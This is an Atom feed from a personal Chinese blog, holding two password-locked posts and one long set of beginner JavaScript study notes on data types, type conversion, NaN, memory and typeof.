<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>star</title>
  
  <subtitle>前端小白|java萌新|Geek精神</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://javastar.club/"/>
  <updated>2019-08-22T16:00:00.000Z</updated>
  <id>http://javastar.club/</id>
  
  <author>
    <name>stardust</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2019年下半年学习计划</title>
    <link href="http://javastar.club/archives/1a186561.html"/>
    <id>http://javastar.club/archives/1a186561.html</id>
    <published>2019-12-30T16:00:00.000Z</published>
    <updated>2019-08-22T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX1/OTHK/a0QMgg8uaEHm05DoBNckukVPXvW4ojRcVtNU1O0VBwKW4j1WkMKzj7MYvUJv9QNDAEBXAZp3z4OYWlr0r7G4qioxDExnCPx2sKFRR3nMTeHZL5b3E4EQarS8S90JjdT6Pb4yj4faNse9y66MJqsG8xudiP6N1P3ulXMp7veMh+7+e0DSVCuBpFxQ8gU4xjqdYDHODZQzouU01XazSVOTh6axu6l2+MNhn4TTSEjUmsvQzOehP4dgOIRj5idcORciwXgxRDPEerQsmanlaY0AX32w7t01gcaoUxNUgraLxqLQcAiMfL395yUjuDaiClLJ/t+bX+l4cVQGV0SwL5uEAJTDc0g=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="学习计划" scheme="http://javastar.club/categories/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    
    
      <category term="学习计划" scheme="http://javastar.club/tags/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>Java开发</title>
    <link href="http://javastar.club/archives/8c2959bc.html"/>
    <id>http://javastar.club/archives/8c2959bc.html</id>
    <published>2019-08-21T13:53:54.000Z</published>
    <updated>2019-08-23T03:26:34.888Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="Java基础" scheme="http://javastar.club/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java基础" scheme="http://javastar.club/tags/Java%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>前端学习笔记</title>
    <link href="http://javastar.club/archives/91ce7628.html"/>
    <id>http://javastar.club/archives/91ce7628.html</id>
    <published>2019-08-21T08:35:43.000Z</published>
    <updated>2019-08-23T12:32:04.543Z</updated>
    
    <content type="html"><![CDATA[<p>test</p><a id="more"></a><h3 id="常用浏览器内核"><a href="#常用浏览器内核" class="headerlink" title="常用浏览器内核"></a>常用浏览器内核</h3><ul>  <li>    <p>webkit内核(V8引擎)</p>  </li>  <li>    <p>Gecko</p>  </li>  <li>    <p>Presto</p>  </li>  <li>    <p>Trident</p>  </li></ul><h3 id="谷歌浏览器的控制台：-Fn-f12"><a href="#谷歌浏览器的控制台：-Fn-f12" class="headerlink" title="谷歌浏览器的控制台：(Fn+f12)"></a>谷歌浏览器的控制台：(Fn+f12)</h3><ul>  <li>    <p>Elements: 查看结构样式，可以修改这些内容</p>  </li>  <li>    <p>Console: 查看输出结果和报错信息，是JS调试的利器</p>  </li>  <li>    <p>Sources: 查看项目源码</p>  </li>  <li>    <p>Network: 查看当前网站所有资源的请求信息(包括和服务器传输的HTTP报文信息)，加载时间等(根据加载时间进行项目优化)</p>  </li>  <li>    <p>Application:查看当前网站的数据存储和资源文件(可以盗图) 防盗等技术</p>  </li></ul><h3 id="JS做客户端语言"><a href="#JS做客户端语言" class="headerlink" title="JS做客户端语言"></a>JS做客户端语言</h3><blockquote>  <p>按照相关的JS语法，去操作页面中的元素，有时还要操作浏览器里面的一些功能</p></blockquote><ul>  <li>    <p>ECMAScript3/5/6…: JS的语法规范(变量、数据类型、操作语句等)</p>  </li>  <li>    <p>DOM(document object model):文档对象模型，提供一些JS的属性和方法，用来操作页面的DOM元素</p>  </li>  <li>    <p>BOM(browser object model): 浏览器对象模型，提供一些JS的属性和方法，用来操作浏览器的</p>  </li></ul><h3 id="JS中的变量-variable"><a href="#JS中的变量-variable" class="headerlink" title="JS中的变量 variable"></a>JS中的变量  variable</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>      </td>      <td class="code">        <pre><span class="line">//创建函数也相当于创建变量</span><br><span class="line">function fn()&#123;&#125;</span><br><span class="line">//创建类也相当于创建变量</span><br><span class="line">class A&#123;&#125;</span><br><span class="line">//ES6模块的导入也可以创建变量</span><br><span class="line">import B from &apos;./B.js&apos;;</span><br><span class="line">//Symbol创建唯一值</span><br><span class="line">let n=Symbol(100);</span><br><span class="line">let m=Symbol(100);</span><br></pre>      </td>    </tr>  </table></figure><h3 id="JS中的命名规范"><a href="#JS中的命名规范" class="headerlink" title="JS中的命名规范"></a>JS中的命名规范</h3><ul>  <li>严格区分大小写</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">let Test=100;</span><br><span class="line">console.log(Test);</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>    <p>使用数字、字母、下划线、$，数字不能作为开头</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">let $box;//一般用JQ获取的以$开头</span><br><span class="line">let _box;//一般公共变量都是_开头</span><br><span class="line">let 1box;//不可以，但是可以写box1</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p>驼峰命名法： 首字母小写，其余每一个有意义的首字母都要大写(命名尽可能语义化明显，使用英文单词)</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">let studentInformation;</span><br><span class="line">let studentInfo;</span><br><span class="line">//常用的缩写：add/insert/create/new,update, delete/del/remove/rm, sel/select/query/get,info</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><h3 id="JS中常用的数据类型"><a href="#JS中常用的数据类型" class="headerlink" title="JS中常用的数据类型"></a>JS中常用的数据类型</h3><ul>  <li>基本数据类型<ul>      <li>数字number<br>常规数字和NaN</li>      <li>字符串string<br>所有用单引号、双引号、反引号包起来的都是字符串</li>      <li>布尔 boolean<br>true/false</li>      <li>空对象指针null</li>      <li>未定义undefined</li>    </ul>  </li>  <li>引用数据类型<ul>      <li>对象数据类型object<ul>          <li>{} 普通对象</li>          <li>[] 数组对象</li>          <li>/^[+-]?(\d|([1-9]\d+))(\ .\d+)?$/ 正则对象</li>          <li>Math数学函数对象</li>          <li>日期对象</li>          <li>…</li>        </ul>      </li>      <li>函数数据类型function</li>    </ul>  </li></ul><h3 id="NaN"><a href="#NaN" class="headerlink" title="NaN"></a>NaN</h3><blockquote>  <p>not a number:不是一个数，但他属于数字类型</p></blockquote><p>NaN和任何值包括自己都不相等，所以我们不能用相等的方式判断是否为有效数字</p><h3 id="isNaN"><a href="#isNaN" class="headerlink" title="isNaN"></a>isNaN</h3><blockquote>  <p>检测一个值是否为非有效数字</p></blockquote><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">console.log(isNaN(10));</span><br><span class="line"></span><br><span class="line">console.log(isNaN(&apos;AA&apos;));</span><br><span class="line">=&gt; Number(&apos;AA&apos;)=&gt;NaN</span><br><span class="line">=&gt; isNaN(NaN)=&gt;TRUE</span><br></pre>      </td>    </tr>  </table></figure><p>在使用isNaN进行检测时，首先会验证检测的值是否为数字类型，如果不是，先基于Number()这个方法，</p><h3 id="把其他类型值转换为数字类型"><a href="#把其他类型值转换为数字类型" class="headerlink" title="把其他类型值转换为数字类型"></a>把其他类型值转换为数字类型</h3><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre>      </td>      <td class="code">        <pre><span class="line">//把字符串转换为数字，只要字符串包含任意一个非有效数字字符(第一个点除外)，结果都是NaN</span><br><span class="line">console.log(Number(&apos;12.5&apos;));//=&gt;12.5</span><br><span class="line">console.log(Number(&apos;12.5px&apos;));//NaN</span><br><span class="line">console.log(Number(&apos;&apos;));//0</span><br><span class="line"></span><br><span class="line">//bool translate number</span><br><span class="line">console.log(Number(true));//=&gt;1</span><br><span class="line">console.log(Number(false));//=&gt;0</span><br><span class="line">console.log(isNaN(false));//=&gt;false</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">console.log(Number(undefined));//=&gt;NaN</span><br><span class="line">console.log(Number(null));//=&gt;0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//把引用数据类型转换为数字，是先把他基于toString方法转换为字符串，然后再转换为数字</span><br><span class="line">console.log(Number(&#123;name:&apos;10&apos;&#125;));//NaN</span><br><span class="line">console.log(Number(&#123;&#125;));//NaN</span><br><span class="line"></span><br><span class="line">//&#123;&#125;/&#123;&apos;x&apos;:&apos;x&apos;&#125;.toString()=&gt;&quot;[object Object]&quot;=&gt;NaN</span><br><span class="line"></span><br><span class="line">//[].toString()=&gt;&apos;&apos;</span><br><span class="line">console.log(Number([]));// -&gt; 0</span><br><span class="line"></span><br><span class="line">//[].toString()=&gt;&apos;12&apos;</span><br><span class="line">console.log(Number([12]));// -&gt; 12</span><br><span class="line"></span><br><span class="line">//[].toString()=&gt;&apos;12,23&apos;</span><br><span class="line">console.log(Number([12,23]));// -&gt; NaN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">let str=&apos;12.5px&apos;;</span><br><span class="line">console.log(Number(str));//=&gt;NaN</span><br><span class="line">console.log(parseInt(str));//=&gt;12</span><br><span class="line">console.log(parseFloat(str));//=&gt;12.5</span><br><span class="line">console.log(parseFloat(&apos;width:12.5px&apos;));//=&gt;NaN</span><br></pre>      </td>    </tr>  </table></figure><ul>  <li>    <p>Number([val])</p>  </li>  <li>    <p>      parseInt/parseFloat([val],[进制]):也是转换数字的方法，对于字符串来说，它是从左到右依次查找有效数字字符，直到遇到非有效数字字符，停止查找(不管后面是否还有数字，都不再找了)，把找到的当做数字返回    </p>  </li>  <li>    <p>==进行比较的时候，可能要出现把其他类型值转换为数字</p>  </li></ul><h2 id="String字符串数据类型"><a href="#String字符串数据类型" class="headerlink" title="String字符串数据类型"></a>String字符串数据类型</h2><blockquote>  <p>所有用单引号、双引号、反引号包起来的都是字符串</p></blockquote><h3 id="把其他类型值转换为字符串"><a href="#把其他类型值转换为字符串" class="headerlink" title="把其他类型值转换为字符串"></a>把其他类型值转换为字符串</h3><ul>  <li>[val].toString()</li>  <li>字符串拼接</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre>      </td>      <td class="code">        <pre><span class="line">let a=12;</span><br><span class="line">console.log(a.toString());//=&gt;&apos;12&apos;</span><br><span class="line">console.log((NaN).toString());//=&gt;&apos;NaN&apos;</span><br><span class="line">/*</span><br><span class="line">null和undefined是禁止直接toString的</span><br><span class="line">(null).toString() =&gt; 报错</span><br><span class="line">但是和undefined一样转换为字符串的结果就是&apos;null&apos;/&apos;undefined&apos;</span><br><span class="line">*/ </span><br><span class="line"></span><br><span class="line">//普通对象.toString()的结果是&quot;[object Object]&quot;=&gt;?</span><br><span class="line">=&gt; Object.prototype.toString方法不是转换为字符串的，而是用来检测数据类型的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//字符串拼接：只有加法可能出现字符串拼接，一旦遇到字符串，则即是字符串拼接。</span><br><span class="line">console.log(&apos;10&apos;+10);//=&gt;&apos;1010&apos;</span><br><span class="line">console.log(&apos;10&apos;-10);//=&gt;0</span><br><span class="line">console.log(&apos;10px&apos;-10);//=&gt;NaN</span><br><span class="line"></span><br><span class="line">let a=10+null+true+[]+undefined+&apos;珠峰&apos;+null+[]+10+false;</span><br><span class="line"></span><br><span class="line">//10+null-&gt;0+true-&gt;1+[]-&gt;&apos;&apos; 空数组变为数字，先要经历变为空字符串，遇到字符串，直接变为字符串拼接。</span><br><span class="line"></span><br><span class="line">-&gt;&apos;11&apos;+undefined-&gt;&apos;11undefined&apos;</span><br><span class="line"></span><br><span class="line">-&gt;&apos;11undefined珠峰null10false&apos;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="boolean布尔数据类型"><a href="#boolean布尔数据类型" class="headerlink" title="boolean布尔数据类型"></a>boolean布尔数据类型</h2><blockquote>  <p>只有两个值 true/false</p></blockquote><h3 id="把其他类型值转换为布尔类型"><a href="#把其他类型值转换为布尔类型" class="headerlink" title="把其他类型值转换为布尔类型"></a>把其他类型值转换为布尔类型</h3><blockquote>  <p>只有0、NaN、’’、null、undefined五个值转换为FALSE，其余都转换为TRUE(而且没有任何特殊的情况)</p></blockquote><ul>  <li>Boolean([val])</li>  <li>!/!!</li>  <li>条件判断</li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">//!:取反(先转为布尔，然后取反)</span><br><span class="line">console.log(!1);//false</span><br><span class="line">console.log(!!1);//等价于Boolean !!:取反再取反，只相当于转换为布尔</span><br></pre>      </td>    </tr>  </table></figure><h2 id="null-undefined"><a href="#null-undefined" class="headerlink" title="null/ undefined"></a>null/  undefined</h2><blockquote>  <p>null和undefined都代表的是没有</p></blockquote><ul>  <li>    <p>null: 意料之中(一般都是开始不知道值，我们手动先设置为null，后期再给予赋值操作)</p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>          </td>          <td class="code">            <pre><span class="line">let num=null;//=&gt;let num=0;  一般最好用null作为初始的空值，因为零不是空值，他在栈内存中有自己的存储空间(占了位置)</span><br><span class="line"></span><br><span class="line">num=12;</span><br></pre>          </td>        </tr>      </table>    </figure>  </li>  <li>    <p>undefined：意料之外(不是我能决定的)</p>  </li></ul><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">let num;//=&gt;创建一个变量没有赋值，默认值是undefined</span><br><span class="line"></span><br><span class="line">num=12;</span><br></pre>      </td>    </tr>  </table></figure><h3 id="object对象数据类型-普通对象"><a href="#object对象数据类型-普通对象" class="headerlink" title="object对象数据类型-普通对象"></a>object对象数据类型-普通对象</h3><blockquote>  <p>{[key]:[value],…} 任何一个对象都是由零到多组键值对(属性名：属性值)组成的(并且属性名不能重复)</p></blockquote><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre>      </td>      <td class="code">        <pre><span class="line">let person=&#123;</span><br><span class="line">    name: &apos;star&apos;,</span><br><span class="line">    age: 40,</span><br><span class="line">    height: &apos;18cm&apos;,</span><br><span class="line">    weight: &apos;40kg&apos;,</span><br><span class="line">    1: 100</span><br><span class="line">&#125;;</span><br><span class="line">//获取属性名对应的属性值</span><br><span class="line">//=&gt;对象.属性名</span><br><span class="line">//=&gt;对象[属性名] 属性名是数字或字符串格式的</span><br><span class="line">//=&gt;如果当前属性名不存在，默认的属性值时undefined</span><br><span class="line">//=&gt;如果属性名是数字，则不能使用点的方式获取属性值</span><br><span class="line">console.log(person.name);</span><br><span class="line"></span><br><span class="line">console.log(person[&apos;age&apos;]);</span><br><span class="line"></span><br><span class="line">console.log(person.sex); //=&gt;undefined</span><br><span class="line"></span><br><span class="line">console.log(person[&apos;height&apos;]);</span><br><span class="line"></span><br><span class="line">console.log(person[1]);</span><br><span class="line">//删除属性</span><br><span class="line">//=&gt;真删除：把属性彻底删掉</span><br><span class="line">//=&gt;假删除：属性还在，值为空</span><br><span class="line">delete person[1];</span><br><span class="line"></span><br><span class="line">person.weight=null;</span><br><span class="line">console.log(person);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//设置属性名属性值</span><br><span class="line">//=》属性名不能重复，如果属性名已经存在，不属于新增，属于修改属性值</span><br><span class="line">/*person.GF=&apos;TT&apos;;</span><br><span class="line">person.name=&apos;李易峰&apos;;</span><br><span class="line">console.log(person[&apos;GF&apos;]);</span><br><span class="line">console.log(person[&apos;name&apos;]);</span><br><span class="line">*/</span><br></pre>      </td>    </tr>  </table></figure><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre>      </td>      <td class="code">        <pre><span class="line">function count(str)</span><br><span class="line">&#123;</span><br><span class="line">    if(isNaN(parseInt(str,10)))</span><br><span class="line">    &#123;</span><br><span class="line">        alert(&quot;该字符串完全由数字组成&quot;);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        alert(&quot;该字符串不完全由字符组成&quot;);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   数组是特殊的对象</span><br><span class="line">   1. 我们中括号中设置的是属性值，它的属性名是默认生成的数字，从零开始递增，而且这个数字代表每一项的位置，我们把其称为“索引”=》从零开始，连续递增，代表每一项位置的数字属性名</span><br><span class="line">   2. 默认一个属性名length,存储数组的长度</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">let array=[12,&apos;test&apos;,true,41];</span><br><span class="line">console.log(array);</span><br><span class="line">console.log(array.length);</span><br><span class="line">console.log(array[&apos;length&apos;]);</span><br><span class="line">console.log(array[1]);</span><br><span class="line">console.log(array[array.length-1]);</span><br><span class="line">//向数组末尾增加内容</span><br><span class="line">array[array.length]=100;</span><br><span class="line">console.log(array);</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//怎么判断是否是字符</span><br><span class="line">/*function t(str)&#123;</span><br><span class="line">    if (/[^\x00-\xff]/g.test(str))//[^\x00-\xff]即ASCII 编码不在0-255的字符</span><br><span class="line"> alert(&quot;含有汉字&quot;);          </span><br><span class="line">else alert(&quot;全是字符&quot;);   </span><br><span class="line">&#125;</span><br><span class="line">console.log(t(&quot;你好&quot;));</span><br><span class="line">console.log(t(&quot;adsfa&quot;));</span><br><span class="line">console.log(t(&quot;测试&quot;));*/</span><br><span class="line"></span><br><span class="line">let n=&#123;</span><br><span class="line">    name: &apos;珠峰&apos;</span><br><span class="line">&#125;;</span><br><span class="line">let m=n;</span><br><span class="line">m.name=&apos;培训&apos;;</span><br><span class="line">console.log(n.name);</span><br><span class="line">console.log(m.name);</span><br></pre>      </td>    </tr>  </table></figure><blockquote>  <p>浏览器想要执行js代码：</p>  <ol>    <li>从电脑内存中分配存储一块内存，用来执行代码(栈内存=&gt;Stack)</li>    <li>分配一个主线程，用来自上而下执行js代码</li>  </ol></blockquote><p>栈内存： 变量存储空间、值存储空间。</p><p>例子： </p><p><strong>let a=12;</strong> 进栈执行<br> 执行完出栈，下一行代码才能进栈执行。</p><p> a. 创建变量a，放到当前栈内存变量存储区域中<br> b. 创建一个值12，把它存储到当前栈内存值区域中(复杂的引用类型值不是这样的)<br> c.  =为赋值，其实赋值是让变量和值相互关联的过程。</p><p><strong>let b=a;</strong></p><p> a和b均指向12</p><p><strong>b=13;</strong></p><p> b指向13，不指向12</p><h5 id="复杂值-引用类型值-的存储，又分成了三个步骤："><a href="#复杂值-引用类型值-的存储，又分成了三个步骤：" class="headerlink" title="复杂值(引用类型值)的存储，又分成了三个步骤："></a>复杂值(引用类型值)的存储，又分成了三个步骤：</h5><ol>  <li>在内存中分配出一块新内存，用来存储引用类型值(堆内存=&gt;heap) =&gt;内存中有一个16进制地址</li>  <li>把对象中的键值对依次存储到堆内存中</li>  <li>把堆内存地址和变量关联起来</li></ol><p>基本类型：按值操作(直接操作的是值)，所以也叫做值类型<br>引用类型：操作的是堆内存的地址(按引用地址操作的)</p><p>画图分析底层原理。<br><img src="https://github.com/starstarb/clouding/raw/master/js/js.png" alt></p><h3 id="JS中的数据类型检测"><a href="#JS中的数据类型检测" class="headerlink" title="JS中的数据类型检测"></a>JS中的数据类型检测</h3><ul>  <li>    <p>typeof[val] :用来检测数据类型的运算符</p>  </li>  <li>    <p>instanceof: 用来检测当前实例是否属于某个类</p>  </li>  <li>    <p>constructor: 基于构造函数检测数据类型(也是基于类的方式)</p>  </li>  <li>    <p>Object.prototye.toString.call(): 检测数据类型最好的办法<br><img src="https://github.com/starstarb/clouding/raw/master/js/%E9%98%BF%E9%87%8C%E9%9D%A2%E8%AF%95%E9%A2%98.png" alt>    </p>    <figure class="highlight plain">      <table>        <tr>          <td class="gutter">            <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre>          </td>          <td class="code">            <pre><span class="line"></span><br><span class="line">// let n=[10,20];</span><br><span class="line">// let m=n;</span><br><span class="line">// let x=m;</span><br><span class="line">// m[0]=100;</span><br><span class="line">// x=[30,40];</span><br><span class="line">// x[0]=200;</span><br><span class="line">// m=x;</span><br><span class="line">// m[1]=300;</span><br><span class="line">// n[2]=400;</span><br><span class="line">// console.log(n,m,x);</span><br><span class="line"></span><br><span class="line">// let a=&#123;</span><br><span class="line">//     n:1</span><br><span class="line">// &#125;;</span><br><span class="line">// let b=a;</span><br><span class="line">// a.x=a=&#123;</span><br><span class="line">//     n:2</span><br><span class="line">// &#125;;</span><br><span class="line"></span><br><span class="line">// console.log(a.x);</span><br><span class="line">// console.log(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   基于typeof检测出来的结果</span><br><span class="line">   1. 首先是一个字符串</span><br><span class="line">   2. 字符串中包含对应的类型</span><br><span class="line">   局限性：</span><br><span class="line">     1. typeof null-&gt; &quot;object&quot; ，但是null并不是对象</span><br><span class="line">     2. 基于typeof无法细分出当前值是普通对象还是数组对象，因为只要是对象数据类型，返回的结果都是“Object”</span><br><span class="line">*/</span><br><span class="line">// console.log(typeof 1);</span><br><span class="line">// let a=NaN;</span><br><span class="line">// console.log(typeof a);//=&gt;&apos;number&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">console.log(typeof typeof typeof []);</span><br><span class="line"></span><br><span class="line">//=&gt;typeof []=&gt;&quot;object&quot;</span><br><span class="line">//typeof &quot;object&quot; =&gt; &quot;string&quot;</span><br><span class="line">//因为typeof检测的结果都是字符串，所以只要两个及以上同时检测，最后结果必然是&quot;string&quot;</span><br></pre>          </td>        </tr>      </table>    </figure>  </li></ul><p><img src="https://github.com/starstarb/clouding/raw/master/js/typeof.png" alt></p><h3 id="JS中的操作语句：判断、循环"><a href="#JS中的操作语句：判断、循环" class="headerlink" title="JS中的操作语句：判断、循环"></a>JS中的操作语句：判断、循环</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;test&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://javastar.club/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://javastar.club/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Java设计模式学习(二)</title>
    <link href="http://javastar.club/archives/b4a8b758.html"/>
    <id>http://javastar.club/archives/b4a8b758.html</id>
    <published>2019-08-19T07:29:49.000Z</published>
    <updated>2019-08-23T03:45:52.239Z</updated>
    
